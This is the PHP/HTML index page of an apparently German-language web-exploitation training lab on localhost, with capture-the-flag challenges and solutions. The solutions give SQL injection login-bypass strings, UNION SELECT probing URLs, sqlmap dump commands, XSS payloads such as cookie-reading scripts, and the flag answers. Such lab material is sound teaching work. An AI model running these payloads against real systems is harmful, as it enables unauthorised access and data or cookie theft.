<!DOCTYPE html>
<html lang="en">
<title> SQL-Injection</title>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <base href="http://localhost:8026"/>
    <link rel="stylesheet" href="/css/style.css">
</head>

<body>

    <form action="index.php" method="POST" id="f">

        <input type="checkbox" id="flag1" name="check" />
        <input type="checkbox" id="flag2" name="check" />
        <input type="checkbox" id="flag3" name="check" />
        <input type="checkbox" id="checkbox" name="check_round1" >
        <input type="checkbox" id="s1_solution" name="s1_solution" value="1" >
	<input type="checkbox" id="s2_solution" name="s2_solution" value="1">
	<input type="checkbox" id="s2_alternative" name="solution" >
        <input type="checkbox" id="xssRefSolution" name="xssRef" >
        <input type="checkbox" id="xssPersSolution" name="xssPers" >

        <div class=" title">
            <div class="inhalt">
                <div style ="margin: 10px 70px;font-size: 18px; position: absolute; float : left;"><a href="http://localhost">Startseite</a></div>

                <h1> WEB Exploitation</h1>
            </div>
        </div>

        <div class="box">
            <h1> SQL-Injection</h1>
            <ul>
		<li>
                    <a href="Einleitung/einleitung1.php"><span style="color :#0c2461; text-decoration:none;">Einleitung</span></a>
                </li>

                <li><button type="submit" name="stufe1"> Anfreifbare Login Seite </button>

                </li>
                <li><span style="color:#0c2461">Union-Injection</span>
                    <label for="flag2" class="flag2" ">Union-Injection Union-Injection</label>
                </li>

            </ul>
        </div>
        <div class="box">
            <h1> XSS-Injection</h1>
            <ul>
		<li><a href="Einleitung/einleitung2.php"><span style="color :#0c2461; text-decoration:none;">Einleitung</span></a>

                </li>
                <li><span style="color:#0c2461"> Reflektiertes XSS </span>
                    <label for="flag2" class="flag2">Reflektiertes XSS Reflektiertes XSS</label>
                </li>
                <li><span style="color:#0c2461"> Persistentes XSS </span>
                    <label for="flag3" class="flag3">Persistentes XSS Persistentes XSS</label>
                </li>

            </ul>
        </div>
        <div class="rahmen">

            <div class="box">

                <div class="auswahl">
                    <div class="auswahl2">
                        <?php

                        $status = false;
                        if ((isset($_POST['stufe1'])) | (isset($_POST['login']))) {
                            echo '<div class = "chall1"><strong>Challenge 1: Demonstration einer SQL-Injection-Sicherheitslücke </strong></div>';

                            echo "<br/> <br/>";
                            echo '<div style="color: black; text-align: left; margin: -24px 41px;font-size: 14px;float: left;position: absolute;width: 420px;"><strong> In dieser Challenge entdeckst du Möglichkeiten zum Einloggen , ohne Passwort zu kennen.</br></strong></div>';
                        } ?>
                    </div>


                    <?php
                        $flag = trim($_POST['flag_eingabe']);
                    if ((isset($_POST['flag_btn']))|(isset($_POST['back']))) {
                         include("check_flags.php");
                    }
		    if($flag==480|(isset($_POST['back1']))){
                            echo '<div style="margin: 20px 10px;color:blue;"> <strong> Challenge 3: Demonstration einer Reflektiertes XSS-Injection </strong></div>';
                            echo '<div style="color: black;font-size: 14px;float: left;position: absolute;text-align: justify;padding: 10px 10px;"><strong style="white-space: pre-wrap;"> Diese Challelge beinhaltet 3 Stufen, die sich mit reflekteirtem XSS-Injection beschäftigt</strong></br><br></div>';
                            echo'<div><strong style="position: absolute; margin: 63px -238px;width: 467px;text-align: left;white-space: pre-wrap;"> Nachdem du 3-te Stufe gelöst hast, erhältest du den Flag für die nächste Challenge.</strong> </div>';

 		           echo '<div style="margin: 129px 90px; background-color: #898e863d;box-sizing: border-box;border-radius: 10px;width: 126px;height: 54px;position:absolute;">
			<a href="xssChallenge/xssRef.php" style =" color:black; margin: 17px -29px;text-decoration: none; position: absolute;"> Beginn</a></div>';
			echo '<div style="margin: 128px 240px; background-color: #898e863d;box-sizing: border-box;border-radius: 10px;width: 126px;height: 54px;position:absolute;">
			<label for="xssRefSolution" style=" color:black;position:absolute; margin:-33px -35px;" >Lösungen</label>  </div>';
			}
                    if($flag==37|(isset($_POST['back2']))){
                            echo '<div style="margin: 20px 10px;color:blue;"><strong> Challenge 4: Demonstration einer Persistentes XSS-Injection </strong></div>';
                            echo '<div style="color: black;float: left;position: absolute;text-align: justify;padding: 10px 10px;"><strong style="white-space: pre-wrap;"> Diese Challelge beinhaltet 2 Stufen, die mit persistentem XSS-Injection beschäftigen</strong></br><br></div>';
                            echo'<div><strong style="position: absolute; margin: 63px -238px;width: 467px;text-align: left; white-space: pre-wrap;"> Wenn du 2-te Stufe gelöst hast, wirst du SQL-Injection und XSS-Injection Challenges erfolgreich abschließen. </strong> </div>';
                echo '<div style="margin: 145px 90px; background-color: #898e863d;box-sizing: border-box;border-radius: 10px;width: 126px;height: 54px;position:absolute;"><a href="xssChallenge/xssPers.php" style =" color:black; margin: 17px -29px;text-decoration: none; position: absolute;"> Beginn</a></div>';
                echo '<div style="margin: 145px 240px; background-color: #898e863d;box-sizing: border-box;border-radius: 10px;width: 126px;height: 54px;position:absolute;"><label for="xssPersSolution" style=" color:black;position:absolute; margin:-33px -35px;" >Lösungen</label>  </div>';

		}
                    ?>
                       <?php
                        include 'conn.php';
                        $done = false;
                        if (isset($_POST['stufe1']) | (isset($_POST['login']))) {
                            echo '<div class="round1">  Beginn
                            <label for="checkbox" class="begin">Beginn</label>  </div>';
                            if (isset($_POST['stufe1'])){ 
                            echo '<div class="round2">  Lösungen
                            <label for="s2_solution" class="begin1">Lösung</label>  </div>';
			}
                       echo '<div class="round2">  Lösungen  <label for="s2_solution" class="begin1">Lösung</label>  </div>';
                  	echo"<br/><br/><br/>";

			include 'sql_select.php';
                            if ($status == false) {
                            echo"<br/>";    include 'ausgabe.php';
                            }
                         //   do{
                                if (isset($_POST['cancel'])) {
                                    echo'<a href="javascript:history.back()">';
                                }
                           // } while (0);
                        }
			 ?>
                        <?php if ($status == true) {
                            echo '<div id="erg" ><h3> Ungültige Eingabe!</h3> </div>';
                        }
                        ?>

                    </div>
            </div>
        </div>

        <div class="flag_popup">
            <div class="flag_eingabe">
                <input type="text" id="flag_text" name="flag_eingabe" autocomplete="off" placeholder="Geben sie Flag ein:" style="width: 322px;height: 40px; margin: 1px 20px; ">
            </div>
            <div class="flag_btn">
                <input type="submit" name="flag_btn" value="submit"
                    style="  height: 40px;width: 350px; margin: 10px 30px;
                    background: #00dbff52; border-top-right-radius: 10px; border-top-left-radius: 10px;border-bottom-right-radius: 10px; border-bottom-left-radius: 10px;">
            </div>
        </div>
         <div class="solution2"> <p style="text-align:center;">1. Gebe dem Benutzername den Wert <strong> admin' or 1='1 </strong> ein. </p><p style="text-align:center;">2. Alternative Lösungen:</p><p style="text-align:center;"><strong> admin' OR 1='1;--</strong></p><p style="text-align:center;"> <strong> admin' # </strong></p> <p style="text-align:center;"><strong> admin' or 1=1#  </strong></p></div>
         <div class="xss1Solution"> <p style="font-size: 15px"> <strong> Stufe 1: <*script> alert('Code')<*/script> <br><br> Stufe 2: <*script> alert(window.location.host)<*/script> <br> <br> Stufe 3: <br><br> 1) <*scri<*script>pt> alert('Code')<*/script>) <br> 2) <*img src=1 onerror =alert('Code')><br><br> * Ohne Leerzeichen </strong></p></div> 
<div class="xss2Solution"> <p style="font-size: 15px"><strong> Stufe 1: <*script>alert(document.cookie)<br><*/script> <br><br> Stufe 2: <*script>document.getElementById<br>("comment").innerHTML="Feedback";<*/script><br><br> * Ohne Leerzeichen</strong></p></div> 


        <div class="solution"><label for="s2_alternative"style="margin: 311px 10px;"> Alternative Lösung </label><p style="font-size: 13px">1. Exacte Anzahl der Spalten: Erhöhe Spaltennummer, bis ein Fehler zeigt. Die Tabelle hat insgesamt 5 Spalten.</p><p style="font-size: 13px"><strong> http://localhost:8026/union_injection.php?id=1 order by 5</strong> </p><p style="font-size: 13px"> 2. In diesem Fall sind alle Spalten anfällig. Das kannst du folgende Query testen: <p style="font-size: 13px"><strong> http://localhost:8026/union_injection.php?id=1 union select 'a','a','a','a','a' </strong> <- a ist biliebig </p><p style="font-size: 13px">3. Hier geht es um die von nicht sichtbarer Spalte Umsatz das gesamtes Wert zu berechnen und herauszufinden.3 Spalten sind sichtbar. Das kannst du ausnutzen, weil die alle anfällig sind. Deswegen kannst du eine von dieser Spalte Z.b Folgende Query eingeben:</p><p style="font-size: 13px"><strong>http://localhost:8026/union_injection.php?id=1 union select sum(), null,null,null,null  </strong> </p><p style="font-size: 13px"> Das Ergebnis sollte <strong>  "480"</strong> zeigen.</p> <br><p style ="color:blue; text-decoration:underline; margin:0px 10px;"> Alternative Lösung </p></div>

<div class ="alternative_s2">
<legend style="font-size: 13px;white-space: pre-wrap;"><?php  echo"Alternative kannst du diese Challenge mithilfe SQLMap lösen. SQLMap ist ein open source Tool zum Durchführen einer SQL-Injection. Dieses Tool ist unter Kali Linux verfügbar. Gebe folgende Befehle in Terminal ein:"; ?></legend>
<p style="font-size: 13px;white-space: pre-wrap;"> <strong><?php echo"->sqlmap -u http://localhost:8026/union_injection.php?id=1 --dbs";?></strong> (hier wirst du sehen, welche Datenbank existiert.) </p>
<p style="font-size: 13px;white-space: pre-wrap;"><strong> <?php echo"-> sqlmap -u http://localhost:8026/union_injection.php?id=1 -D test --tables</strong> (hier wirst du sehen, welche Tabellen in Datenbank existieren)";?></p>
<p style="font-size: 13px;white-space: pre-wrap;"><strong> <?php echo"-> sqlmap -u http://localhost:8026/union_injection.php?id=1 -D test -T Filiale --dump"; ?></strong>   (hier zeigt aller Inhalte der Tabelle * Filiale *) </p>  
<p style="background-image: url(sqlmap.png); height: 350px;"></p>

</div>
        <div class="popup">

            <input type="submit" name="cancel" class="cancel" value="x">

            <label for="checkbox" class="cancel"> </label>
            <div class="round"> Stufe 1
            </div>
            <div class="inhalt"></div>
            <?php
            echo "Du kannst den Nutzernamen  admin verwenden. Finde heraus wie du dich ohne Password einlogen kannst. <br /> <br />";

            ?>

            <div class="name">
                <input type="text" name="username" placeholder="username" autocomplete="off">
                <input type="password" name="password" placeholder="Password">
            </div>
            <div class="btn">
                <input type="submit" name="login" value="submit">
            </div>
    </form>

    <div class="hint">
        <ul>
            <p>Hinweise:</p>
            <li>
                <div class="content">
                    <h3>Anführungszeichen (')</h3>
                    <p> Anführungszeichen (') schließt oder öffnet die SQL-Anweisung. <br /> </p>
                </div>

            </li>
            <li>
                <div class="content">
                    <h3> Boolescher Bedingungen Schlüsselwort OR </h3>
                    <p> 1=1 ist eine Anweisung, die immer den Wert true liefert. <br /> </p>
                </div>

            </li>
            <li>
                <div class="content">
                    <h3> # charactor</h3>
                    <p> Das Doppelkreuz (#) kommentieren den Rest der SQL-Anfrage aus.</p>
                </div>
            </li>
            <li>
                <div class="content">
                    <h3> Das Semikolon (;)</h3>
                    <p> Das Semikolon (;) beendet die SQL-Anweisung </p>
                </div>

            </li>

        </ul>
    </div>
     </div>
    </div>

    </form>

</body>

</html>
